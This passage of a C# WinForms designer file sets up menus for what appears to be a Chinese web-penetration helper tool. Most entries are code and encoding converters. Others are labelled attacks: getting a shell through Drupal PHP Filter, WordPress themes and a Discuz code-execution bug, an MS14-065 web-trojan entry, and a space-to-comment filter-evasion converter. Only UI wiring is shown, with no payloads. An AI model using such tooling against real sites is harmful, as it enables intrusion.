            this.pHPPost提交代码post参数ToolStripMenuItem.Click += new System.EventHandler(this.pHPPost提交代码post参数ToolStripMenuItem_Click);
            // 
            // perlPost提交代码post参数ToolStripMenuItem
            // 
            this.perlPost提交代码post参数ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("perlPost提交代码post参数ToolStripMenuItem.Image")));
            this.perlPost提交代码post参数ToolStripMenuItem.Name = "perlPost提交代码post参数ToolStripMenuItem";
            this.perlPost提交代码post参数ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.perlPost提交代码post参数ToolStripMenuItem.Text = "Perl Post提交代码(post参数)";
            this.perlPost提交代码post参数ToolStripMenuItem.Click += new System.EventHandler(this.perlPost提交代码post参数ToolStripMenuItem_Click);
            // 
            // 正转ToolStripMenuItem
            // 
            this.正转ToolStripMenuItem.Name = "正转ToolStripMenuItem";
            this.正转ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.正转ToolStripMenuItem.Text = "------------转换-----------";
            // 
            // jQueryPost代码post参数ToolStripMenuItem1
            // 
            this.jQueryPost代码post参数ToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("jQueryPost代码post参数ToolStripMenuItem1.Image")));
            this.jQueryPost代码post参数ToolStripMenuItem1.Name = "jQueryPost代码post参数ToolStripMenuItem1";
            this.jQueryPost代码post参数ToolStripMenuItem1.Size = new System.Drawing.Size(256, 22);
            this.jQueryPost代码post参数ToolStripMenuItem1.Text = "Post参数 → jQuery Post参数";
            this.jQueryPost代码post参数ToolStripMenuItem1.Click += new System.EventHandler(this.jQueryPost代码post参数ToolStripMenuItem1_Click);
            // 
            // post参数FlashPost参数ToolStripMenuItem
            // 
            this.post参数FlashPost参数ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("post参数FlashPost参数ToolStripMenuItem.Image")));
            this.post参数FlashPost参数ToolStripMenuItem.Name = "post参数FlashPost参数ToolStripMenuItem";
            this.post参数FlashPost参数ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.post参数FlashPost参数ToolStripMenuItem.Text = "Post参数 → Flash Post参数";
            this.post参数FlashPost参数ToolStripMenuItem.Click += new System.EventHandler(this.post参数FlashPost参数ToolStripMenuItem_Click);
            // 
            // post参数PythonPost参数ToolStripMenuItem
            // 
            this.post参数PythonPost参数ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("post参数PythonPost参数ToolStripMenuItem.Image")));
            this.post参数PythonPost参数ToolStripMenuItem.Name = "post参数PythonPost参数ToolStripMenuItem";
            this.post参数PythonPost参数ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.post参数PythonPost参数ToolStripMenuItem.Text = "Post参数 → Python Post参数";
            this.post参数PythonPost参数ToolStripMenuItem.Click += new System.EventHandler(this.post参数PythonPost参数ToolStripMenuItem_Click);
            // 
            // post参数PHPPost参数ToolStripMenuItem
            // 
            this.post参数PHPPost参数ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("post参数PHPPost参数ToolStripMenuItem.Image")));
            this.post参数PHPPost参数ToolStripMenuItem.Name = "post参数PHPPost参数ToolStripMenuItem";
            this.post参数PHPPost参数ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.post参数PHPPost参数ToolStripMenuItem.Text = "Post参数 → PHP Post参数";
            this.post参数PHPPost参数ToolStripMenuItem.Click += new System.EventHandler(this.post参数PHPPost参数ToolStripMenuItem_Click);
            // 
            // 反转ToolStripMenuItem
            // 
            this.反转ToolStripMenuItem.Name = "反转ToolStripMenuItem";
            this.反转ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.反转ToolStripMenuItem.Text = "------------反转-----------";
            // 
            // post参数JQueryPost参数ToolStripMenuItem
            // 
            this.post参数JQueryPost参数ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("post参数JQueryPost参数ToolStripMenuItem.Image")));
            this.post参数JQueryPost参数ToolStripMenuItem.Name = "post参数JQueryPost参数ToolStripMenuItem";
            this.post参数JQueryPost参数ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.post参数JQueryPost参数ToolStripMenuItem.Text = "jQuery Post参数 → Post参数";
            this.post参数JQueryPost参数ToolStripMenuItem.Click += new System.EventHandler(this.post参数JQueryPost参数ToolStripMenuItem_Click);
            // 
            // jQueryPost参数Post参数ToolStripMenuItem
            // 
            this.jQueryPost参数Post参数ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("jQueryPost参数Post参数ToolStripMenuItem.Image")));
            this.jQueryPost参数Post参数ToolStripMenuItem.Name = "jQueryPost参数Post参数ToolStripMenuItem";
            this.jQueryPost参数Post参数ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.jQueryPost参数Post参数ToolStripMenuItem.Text = "Flash Post参数 → Post参数";
            this.jQueryPost参数Post参数ToolStripMenuItem.Click += new System.EventHandler(this.jQueryPost参数Post参数ToolStripMenuItem_Click);
            // 
            // pythonPost参数Post参数ToolStripMenuItem
            // 
            this.pythonPost参数Post参数ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("pythonPost参数Post参数ToolStripMenuItem.Image")));
            this.pythonPost参数Post参数ToolStripMenuItem.Name = "pythonPost参数Post参数ToolStripMenuItem";
            this.pythonPost参数Post参数ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.pythonPost参数Post参数ToolStripMenuItem.Text = "Python Post参数 → Post参数";
            this.pythonPost参数Post参数ToolStripMenuItem.Click += new System.EventHandler(this.pythonPost参数Post参数ToolStripMenuItem_Click);
            // 
            // pHPPost参数Post参数ToolStripMenuItem
            // 
            this.pHPPost参数Post参数ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("pHPPost参数Post参数ToolStripMenuItem.Image")));
            this.pHPPost参数Post参数ToolStripMenuItem.Name = "pHPPost参数Post参数ToolStripMenuItem";
            this.pHPPost参数Post参数ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.pHPPost参数Post参数ToolStripMenuItem.Text = "PHP Post参数 → Post参数";
            this.pHPPost参数Post参数ToolStripMenuItem.Click += new System.EventHandler(this.pHPPost参数Post参数ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem63
            // 
            this.toolStripMenuItem63.Name = "toolStripMenuItem63";
            this.toolStripMenuItem63.Size = new System.Drawing.Size(253, 6);
            // 
            // binFileToolStripMenuItem
            // 
            this.binFileToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem47,
            this.fileHexToolStripMenuItem,
            this.fileASCIIToolStripMenuItem,
            this.toolStripMenuItem48});
            this.binFileToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("binFileToolStripMenuItem.Image")));
            this.binFileToolStripMenuItem.Name = "binFileToolStripMenuItem";
            this.binFileToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.binFileToolStripMenuItem.Text = "File/文件";
            // 
            // toolStripMenuItem47
            // 
            this.toolStripMenuItem47.Name = "toolStripMenuItem47";
            this.toolStripMenuItem47.Size = new System.Drawing.Size(133, 6);
            // 
            // fileHexToolStripMenuItem
            // 
            this.fileHexToolStripMenuItem.Name = "fileHexToolStripMenuItem";
            this.fileHexToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.fileHexToolStripMenuItem.Text = "File→Hex";
            this.fileHexToolStripMenuItem.Click += new System.EventHandler(this.fileHexToolStripMenuItem_Click);
            // 
            // fileASCIIToolStripMenuItem
            // 
            this.fileASCIIToolStripMenuItem.Name = "fileASCIIToolStripMenuItem";
            this.fileASCIIToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.fileASCIIToolStripMenuItem.Text = "File→ASCII";
            this.fileASCIIToolStripMenuItem.Click += new System.EventHandler(this.fileASCIIToolStripMenuItem_Click);
            // 
            // toolStripMenuItem48
            // 
            this.toolStripMenuItem48.Name = "toolStripMenuItem48";
            this.toolStripMenuItem48.Size = new System.Drawing.Size(133, 6);
            // 
            // coderToolStripMenuItem
            // 
            this.coderToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem34,
            this.toolStripMenuItem18,
            this.toolStripMenuItem19,
            this.toolStripMenuItem20,
            this.toolStripMenuItem21,
            this.空格ToolStripMenuItem,
            this.空格JSP代码ToolStripMenuItem,
            this.toolStripMenuItem29,
            this.toolStripMenuItem17,
            this.toolStripMenuItem22,
            this.toolStripMenuItem23,
            this.toolStripMenuItem24,
            this.toolStripMenuItem25,
            this.toolStripMenuItem33,
            this.转成一行ToolStripMenuItem1,
            this.转成一行rnToolStripMenuItem,
            this.转成多行号结尾ToolStripMenuItem,
            this.c转成StringBuilder代码正常ToolStripMenuItem,
            this.c转成StringBuilder代码rnToolStripMenuItem});
            this.coderToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("coderToolStripMenuItem.Image")));
            this.coderToolStripMenuItem.Name = "coderToolStripMenuItem";
            this.coderToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.coderToolStripMenuItem.Text = "Code/代码";
            // 
            // toolStripMenuItem34
            // 
            this.toolStripMenuItem34.Name = "toolStripMenuItem34";
            this.toolStripMenuItem34.Size = new System.Drawing.Size(253, 6);
            // 
            // toolStripMenuItem18
            // 
            this.toolStripMenuItem18.Name = "toolStripMenuItem18";
            this.toolStripMenuItem18.Size = new System.Drawing.Size(256, 22);
            this.toolStripMenuItem18.Text = "转义 \\\"  →  \"";
            this.toolStripMenuItem18.Click += new System.EventHandler(this.toolStripMenuItem18_Click);
            // 
            // toolStripMenuItem19
            // 
            this.toolStripMenuItem19.Name = "toolStripMenuItem19";
            this.toolStripMenuItem19.Size = new System.Drawing.Size(256, 22);
            this.toolStripMenuItem19.Text = "转义 \"  →  \\\"";
            this.toolStripMenuItem19.Click += new System.EventHandler(this.toolStripMenuItem19_Click);
            // 
            // toolStripMenuItem20
            // 
            this.toolStripMenuItem20.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem20.Image")));
            this.toolStripMenuItem20.Name = "toolStripMenuItem20";
            this.toolStripMenuItem20.Size = new System.Drawing.Size(256, 22);
            this.toolStripMenuItem20.Text = "赋值 := → = (Delphi转其它)";
            this.toolStripMenuItem20.Click += new System.EventHandler(this.toolStripMenuItem20_Click);
            // 
            // toolStripMenuItem21
            // 
            this.toolStripMenuItem21.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem21.Image")));
            this.toolStripMenuItem21.Name = "toolStripMenuItem21";
            this.toolStripMenuItem21.Size = new System.Drawing.Size(256, 22);
            this.toolStripMenuItem21.Text = "赋值 = → := (其它转Delphi)";
            this.toolStripMenuItem21.Click += new System.EventHandler(this.toolStripMenuItem21_Click);
            // 
            // 空格ToolStripMenuItem
            // 
            this.空格ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("空格ToolStripMenuItem.Image")));
            this.空格ToolStripMenuItem.Name = "空格ToolStripMenuItem";
            this.空格ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.空格ToolStripMenuItem.Text = "EXP 空格 → /**/  (JSP)";
            this.空格ToolStripMenuItem.Click += new System.EventHandler(this.空格ToolStripMenuItem_Click);
            // 
            // 空格JSP代码ToolStripMenuItem
            // 
            this.空格JSP代码ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("空格JSP代码ToolStripMenuItem.Image")));
            this.空格JSP代码ToolStripMenuItem.Name = "空格JSP代码ToolStripMenuItem";
            this.空格JSP代码ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.空格JSP代码ToolStripMenuItem.Text = "EXP /**/ → 空格  (JSP)";
            this.空格JSP代码ToolStripMenuItem.Click += new System.EventHandler(this.空格JSP代码ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem29
            // 
            this.toolStripMenuItem29.Name = "toolStripMenuItem29";
            this.toolStripMenuItem29.Size = new System.Drawing.Size(253, 6);
            // 
            // toolStripMenuItem17
            // 
            this.toolStripMenuItem17.Name = "toolStripMenuItem17";
            this.toolStripMenuItem17.Size = new System.Drawing.Size(253, 6);
            // 
            // toolStripMenuItem22
            // 
            this.toolStripMenuItem22.Name = "toolStripMenuItem22";
            this.toolStripMenuItem22.Size = new System.Drawing.Size(256, 22);
            this.toolStripMenuItem22.Text = "路径 / → \\\\";
            this.toolStripMenuItem22.Click += new System.EventHandler(this.toolStripMenuItem22_Click);
            // 
            // toolStripMenuItem23
            // 
            this.toolStripMenuItem23.Name = "toolStripMenuItem23";
            this.toolStripMenuItem23.Size = new System.Drawing.Size(256, 22);
            this.toolStripMenuItem23.Text = "路径 \\\\  →  /";
            this.toolStripMenuItem23.Click += new System.EventHandler(this.toolStripMenuItem23_Click);
            // 
            // toolStripMenuItem24
            // 
            this.toolStripMenuItem24.Name = "toolStripMenuItem24";
            this.toolStripMenuItem24.Size = new System.Drawing.Size(256, 22);
            this.toolStripMenuItem24.Text = "路径  /  →  \\";
            this.toolStripMenuItem24.Click += new System.EventHandler(this.toolStripMenuItem24_Click);
            // 
            // toolStripMenuItem25
            // 
            this.toolStripMenuItem25.Name = "toolStripMenuItem25";
            this.toolStripMenuItem25.Size = new System.Drawing.Size(256, 22);
            this.toolStripMenuItem25.Text = "路径 \\  →  /";
            this.toolStripMenuItem25.Click += new System.EventHandler(this.toolStripMenuItem25_Click);
            // 
            // toolStripMenuItem33
            // 
            this.toolStripMenuItem33.Name = "toolStripMenuItem33";
            this.toolStripMenuItem33.Size = new System.Drawing.Size(253, 6);
            // 
            // 转成一行ToolStripMenuItem1
            // 
            this.转成一行ToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("转成一行ToolStripMenuItem1.Image")));
            this.转成一行ToolStripMenuItem1.Name = "转成一行ToolStripMenuItem1";
            this.转成一行ToolStripMenuItem1.Size = new System.Drawing.Size(256, 22);
            this.转成一行ToolStripMenuItem1.Text = "转成一行(正常)";
            this.转成一行ToolStripMenuItem1.Click += new System.EventHandler(this.转成一行ToolStripMenuItem1_Click);
            // 
            // 转成一行rnToolStripMenuItem
            // 
            this.转成一行rnToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("转成一行rnToolStripMenuItem.Image")));
            this.转成一行rnToolStripMenuItem.Name = "转成一行rnToolStripMenuItem";
            this.转成一行rnToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.转成一行rnToolStripMenuItem.Text = "转成一行(\\r\\n)";
            this.转成一行rnToolStripMenuItem.Click += new System.EventHandler(this.转成一行rnToolStripMenuItem_Click);
            // 
            // 转成多行号结尾ToolStripMenuItem
            // 
            this.转成多行号结尾ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("转成多行号结尾ToolStripMenuItem.Image")));
            this.转成多行号结尾ToolStripMenuItem.Name = "转成多行号结尾ToolStripMenuItem";
            this.转成多行号结尾ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.转成多行号结尾ToolStripMenuItem.Text = "转成多行(分号结尾) C/PHP/.NET等";
            this.转成多行号结尾ToolStripMenuItem.Click += new System.EventHandler(this.转成多行号结尾ToolStripMenuItem_Click);
            // 
            // c转成StringBuilder代码正常ToolStripMenuItem
            // 
            this.c转成StringBuilder代码正常ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("c转成StringBuilder代码正常ToolStripMenuItem.Image")));
            this.c转成StringBuilder代码正常ToolStripMenuItem.Name = "c转成StringBuilder代码正常ToolStripMenuItem";
            this.c转成StringBuilder代码正常ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.c转成StringBuilder代码正常ToolStripMenuItem.Text = "C# 转成StringBuilder代码(正常)";
            this.c转成StringBuilder代码正常ToolStripMenuItem.Click += new System.EventHandler(this.c转成StringBuilder代码正常ToolStripMenuItem_Click);
            // 
            // c转成StringBuilder代码rnToolStripMenuItem
            // 
            this.c转成StringBuilder代码rnToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("c转成StringBuilder代码rnToolStripMenuItem.Image")));
            this.c转成StringBuilder代码rnToolStripMenuItem.Name = "c转成StringBuilder代码rnToolStripMenuItem";
            this.c转成StringBuilder代码rnToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.c转成StringBuilder代码rnToolStripMenuItem.Text = "C# 转成StringBuilder代码(\\r\\n)";
            this.c转成StringBuilder代码rnToolStripMenuItem.Click += new System.EventHandler(this.c转成StringBuilder代码rnToolStripMenuItem_Click);
            // 
            // toolStripMenuItem50
            // 
            this.toolStripMenuItem50.Name = "toolStripMenuItem50";
            this.toolStripMenuItem50.Size = new System.Drawing.Size(127, 6);
            // 
            // 进制转换ToolStripMenuItem
            // 
            this.进制转换ToolStripMenuItem.Name = "进制转换ToolStripMenuItem";
            this.进制转换ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.进制转换ToolStripMenuItem.Text = "进制转换";
            // 
            // bat批处理ToolStripMenuItem
            // 
            this.bat批处理ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem60,
            this.bat逻辑命令符说明ToolStripMenuItem,
            this.toolStripMenuItem59,
            this.转成一行2ToolStripMenuItem,
            this.转成一行1ToolStripMenuItem,
            this.转成一行1ToolStripMenuItem1,
            this.转成一行2ToolStripMenuItem1,
            this.每行前面不带注释ToolStripMenuItem,
            this.不转行前ToolStripMenuItem,
            this.toolStripMenuItem57,
            this.转成多行2ToolStripMenuItem,
            this.转成多行1ToolStripMenuItem,
            this.转成多行2ToolStripMenuItem1,
            this.转成多行1ToolStripMenuItem1,
            this.去掉行首ToolStripMenuItem,
            this.去掉注释ToolStripMenuItem,
            this.去掉行首去掉注释ToolStripMenuItem,
            this.toolStripMenuItem58});
            this.bat批处理ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("bat批处理ToolStripMenuItem.Image")));
            this.bat批处理ToolStripMenuItem.Name = "bat批处理ToolStripMenuItem";
            this.bat批处理ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.bat批处理ToolStripMenuItem.Text = "Bat/批处理";
            // 
            // toolStripMenuItem60
            // 
            this.toolStripMenuItem60.Name = "toolStripMenuItem60";
            this.toolStripMenuItem60.Size = new System.Drawing.Size(205, 6);
            // 
            // bat逻辑命令符说明ToolStripMenuItem
            // 
            this.bat逻辑命令符说明ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("bat逻辑命令符说明ToolStripMenuItem.Image")));
            this.bat逻辑命令符说明ToolStripMenuItem.Name = "bat逻辑命令符说明ToolStripMenuItem";
            this.bat逻辑命令符说明ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.bat逻辑命令符说明ToolStripMenuItem.Text = "应用场景: Bat逻辑命令符";
            this.bat逻辑命令符说明ToolStripMenuItem.Click += new System.EventHandler(this.bat逻辑命令符说明ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem59
            // 
            this.toolStripMenuItem59.Name = "toolStripMenuItem59";
            this.toolStripMenuItem59.Size = new System.Drawing.Size(205, 6);
            // 
            // 转成一行2ToolStripMenuItem
            // 
            this.转成一行2ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("转成一行2ToolStripMenuItem.Image")));
            this.转成一行2ToolStripMenuItem.Name = "转成一行2ToolStripMenuItem";
            this.转成一行2ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.转成一行2ToolStripMenuItem.Text = "转成一行(+&&&&)";
            this.转成一行2ToolStripMenuItem.Click += new System.EventHandler(this.转成一行2ToolStripMenuItem_Click);
            // 
            // 转成一行1ToolStripMenuItem
            // 
            this.转成一行1ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("转成一行1ToolStripMenuItem.Image")));
            this.转成一行1ToolStripMenuItem.Name = "转成一行1ToolStripMenuItem";
            this.转成一行1ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.转成一行1ToolStripMenuItem.Text = "转成一行(+&&)";
            this.转成一行1ToolStripMenuItem.Click += new System.EventHandler(this.转成一行1ToolStripMenuItem_Click);
            // 
            // 转成一行1ToolStripMenuItem1
            // 
            this.转成一行1ToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("转成一行1ToolStripMenuItem1.Image")));
            this.转成一行1ToolStripMenuItem1.Name = "转成一行1ToolStripMenuItem1";
            this.转成一行1ToolStripMenuItem1.Size = new System.Drawing.Size(208, 22);
            this.转成一行1ToolStripMenuItem1.Text = "转成一行(+@+&&)";
            this.转成一行1ToolStripMenuItem1.Click += new System.EventHandler(this.转成一行1ToolStripMenuItem1_Click);
            // 
            // 转成一行2ToolStripMenuItem1
            // 
            this.转成一行2ToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("转成一行2ToolStripMenuItem1.Image")));
            this.转成一行2ToolStripMenuItem1.Name = "转成一行2ToolStripMenuItem1";
            this.转成一行2ToolStripMenuItem1.Size = new System.Drawing.Size(208, 22);
            this.转成一行2ToolStripMenuItem1.Text = "转成一行(+@+&&&&)";
            this.转成一行2ToolStripMenuItem1.Click += new System.EventHandler(this.转成一行2ToolStripMenuItem1_Click);
            // 
            // 每行前面不带注释ToolStripMenuItem
            // 
            this.每行前面不带注释ToolStripMenuItem.Name = "每行前面不带注释ToolStripMenuItem";
            this.每行前面不带注释ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.每行前面不带注释ToolStripMenuItem.Text = "每行前面(+@)-不带注释";
            this.每行前面不带注释ToolStripMenuItem.Click += new System.EventHandler(this.每行前面不带注释ToolStripMenuItem_Click);
            // 
            // 不转行前ToolStripMenuItem
            // 
            this.不转行前ToolStripMenuItem.Name = "不转行前ToolStripMenuItem";
            this.不转行前ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.不转行前ToolStripMenuItem.Text = "每行前面(+@)-保留注释";
            this.不转行前ToolStripMenuItem.Click += new System.EventHandler(this.不转行前ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem57
            // 
            this.toolStripMenuItem57.Name = "toolStripMenuItem57";
            this.toolStripMenuItem57.Size = new System.Drawing.Size(205, 6);
            // 
            // 转成多行2ToolStripMenuItem
            // 
            this.转成多行2ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("转成多行2ToolStripMenuItem.Image")));
            this.转成多行2ToolStripMenuItem.Name = "转成多行2ToolStripMenuItem";
            this.转成多行2ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.转成多行2ToolStripMenuItem.Text = "反转一行(+&&&&)";
            this.转成多行2ToolStripMenuItem.Click += new System.EventHandler(this.转成多行2ToolStripMenuItem_Click);
            // 
            // 转成多行1ToolStripMenuItem
            // 
            this.转成多行1ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("转成多行1ToolStripMenuItem.Image")));
            this.转成多行1ToolStripMenuItem.Name = "转成多行1ToolStripMenuItem";
            this.转成多行1ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.转成多行1ToolStripMenuItem.Text = "反转一行(+&&)";
            this.转成多行1ToolStripMenuItem.Click += new System.EventHandler(this.转成多行1ToolStripMenuItem_Click);
            // 
            // 转成多行2ToolStripMenuItem1
            // 
            this.转成多行2ToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("转成多行2ToolStripMenuItem1.Image")));
            this.转成多行2ToolStripMenuItem1.Name = "转成多行2ToolStripMenuItem1";
            this.转成多行2ToolStripMenuItem1.Size = new System.Drawing.Size(208, 22);
            this.转成多行2ToolStripMenuItem1.Text = "反转一行(+@+&&&&)";
            this.转成多行2ToolStripMenuItem1.Click += new System.EventHandler(this.转成多行2ToolStripMenuItem1_Click);
            // 
            // 转成多行1ToolStripMenuItem1
            // 
            this.转成多行1ToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("转成多行1ToolStripMenuItem1.Image")));
            this.转成多行1ToolStripMenuItem1.Name = "转成多行1ToolStripMenuItem1";
            this.转成多行1ToolStripMenuItem1.Size = new System.Drawing.Size(208, 22);
            this.转成多行1ToolStripMenuItem1.Text = "反转一行(+@+&&)";
            this.转成多行1ToolStripMenuItem1.Click += new System.EventHandler(this.转成多行1ToolStripMenuItem1_Click);
            // 
            // 去掉行首ToolStripMenuItem
            // 
            this.去掉行首ToolStripMenuItem.Name = "去掉行首ToolStripMenuItem";
            this.去掉行首ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.去掉行首ToolStripMenuItem.Text = "去行首(@)";
            this.去掉行首ToolStripMenuItem.Click += new System.EventHandler(this.去掉行首ToolStripMenuItem_Click);
            // 
            // 去掉注释ToolStripMenuItem
            // 
            this.去掉注释ToolStripMenuItem.Name = "去掉注释ToolStripMenuItem";
            this.去掉注释ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.去掉注释ToolStripMenuItem.Text = "去注释(::)";
            this.去掉注释ToolStripMenuItem.Click += new System.EventHandler(this.去掉注释ToolStripMenuItem_Click);
            // 
            // 去掉行首去掉注释ToolStripMenuItem
            // 
            this.去掉行首去掉注释ToolStripMenuItem.Name = "去掉行首去掉注释ToolStripMenuItem";
            this.去掉行首去掉注释ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.去掉行首去掉注释ToolStripMenuItem.Text = "去行首(@)+去注释(::)";
            this.去掉行首去掉注释ToolStripMenuItem.Click += new System.EventHandler(this.去掉行首去掉注释ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem58
            // 
            this.toolStripMenuItem58.Name = "toolStripMenuItem58";
            this.toolStripMenuItem58.Size = new System.Drawing.Size(205, 6);
            // 
            // toolStripMenuItem61
            // 
            this.toolStripMenuItem61.Name = "toolStripMenuItem61";
            this.toolStripMenuItem61.Size = new System.Drawing.Size(127, 6);
            // 
            // getShellToolStripMenuItem
            // 
            this.getShellToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.drupal后台PHPFilter拿Shell代码ToolStripMenuItem,
            this.drupal后台PHPFilter拿Shell相对路径ToolStripMenuItem,
            this.discuz6x7x代码执行漏洞ToolStripMenuItem,
            this.wordPress后台主题GetShell相对路径ToolStripMenuItem});
            this.getShellToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("getShellToolStripMenuItem.Image")));
            this.getShellToolStripMenuItem.Name = "getShellToolStripMenuItem";
            this.getShellToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.getShellToolStripMenuItem.Text = "GetShell";
            // 
            // drupal后台PHPFilter拿Shell代码ToolStripMenuItem
            // 
            this.drupal后台PHPFilter拿Shell代码ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("drupal后台PHPFilter拿Shell代码ToolStripMenuItem.Image")));
            this.drupal后台PHPFilter拿Shell代码ToolStripMenuItem.Name = "drupal后台PHPFilter拿Shell代码ToolStripMenuItem";
            this.drupal后台PHPFilter拿Shell代码ToolStripMenuItem.Size = new System.Drawing.Size(292, 22);
            this.drupal后台PHPFilter拿Shell代码ToolStripMenuItem.Text = "Drupal后台PHP Filter拿Shell(绝对路径)";
            this.drupal后台PHPFilter拿Shell代码ToolStripMenuItem.Click += new System.EventHandler(this.drupal后台PHPFilter拿Shell代码ToolStripMenuItem_Click);
            // 
            // drupal后台PHPFilter拿Shell相对路径ToolStripMenuItem
            // 
            this.drupal后台PHPFilter拿Shell相对路径ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("drupal后台PHPFilter拿Shell相对路径ToolStripMenuItem.Image")));
            this.drupal后台PHPFilter拿Shell相对路径ToolStripMenuItem.Name = "drupal后台PHPFilter拿Shell相对路径ToolStripMenuItem";
            this.drupal后台PHPFilter拿Shell相对路径ToolStripMenuItem.Size = new System.Drawing.Size(292, 22);
            this.drupal后台PHPFilter拿Shell相对路径ToolStripMenuItem.Text = "Drupal后台PHP Filter拿Shell(相对路径)";
            this.drupal后台PHPFilter拿Shell相对路径ToolStripMenuItem.Click += new System.EventHandler(this.drupal后台PHPFilter拿Shell相对路径ToolStripMenuItem_Click);
            // 
            // discuz6x7x代码执行漏洞ToolStripMenuItem
            // 
            this.discuz6x7x代码执行漏洞ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("discuz6x7x代码执行漏洞ToolStripMenuItem.Image")));
            this.discuz6x7x代码执行漏洞ToolStripMenuItem.Name = "discuz6x7x代码执行漏洞ToolStripMenuItem";
            this.discuz6x7x代码执行漏洞ToolStripMenuItem.Size = new System.Drawing.Size(292, 22);
            this.discuz6x7x代码执行漏洞ToolStripMenuItem.Text = "Discuz 6.x/7.x 代码执行漏洞(相对路径)";
            this.discuz6x7x代码执行漏洞ToolStripMenuItem.Click += new System.EventHandler(this.discuz6x7x代码执行漏洞ToolStripMenuItem_Click);
            // 
            // wordPress后台主题GetShell相对路径ToolStripMenuItem
            // 
            this.wordPress后台主题GetShell相对路径ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("wordPress后台主题GetShell相对路径ToolStripMenuItem.Image")));
            this.wordPress后台主题GetShell相对路径ToolStripMenuItem.Name = "wordPress后台主题GetShell相对路径ToolStripMenuItem";
            this.wordPress后台主题GetShell相对路径ToolStripMenuItem.Size = new System.Drawing.Size(292, 22);
            this.wordPress后台主题GetShell相对路径ToolStripMenuItem.Text = "WordPress后台主题GetShell(相对路径)";
            this.wordPress后台主题GetShell相对路径ToolStripMenuItem.Click += new System.EventHandler(this.wordPress后台主题GetShell相对路径ToolStripMenuItem_Click);
            // 
            // day网马ToolStripMenuItem
            // 
            this.day网马ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.mS14065ToolStripMenuItem});
